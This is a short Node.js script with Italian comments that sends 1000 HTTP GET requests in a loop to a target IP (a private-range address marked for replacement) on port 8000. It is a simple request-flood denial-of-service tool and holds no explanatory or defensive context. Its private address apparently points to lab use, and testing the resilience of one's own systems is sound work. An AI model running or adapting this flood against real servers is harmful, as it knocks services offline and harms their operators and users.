const http = require('http');

const options = {
  hostname: '192.168.91.131', //Sostituire con l'IP del target
  port: 8000,
  path: '/',
  method: 'GET',
}

function sendRequest() {
  const req = http.request(options, (res) => {
  });

  req.on('error', (error) => {
    console.error(`Errore nella richiesta: ${error.message}`);
  });

  req.end();
}

function startFloodRequest(requestCount) {
  for (let i = 0; i < requestCount; i++) {
    sendRequest();
  }
}

const numberOfRequests = 1000;
startFloodRequest(numberOfRequests);
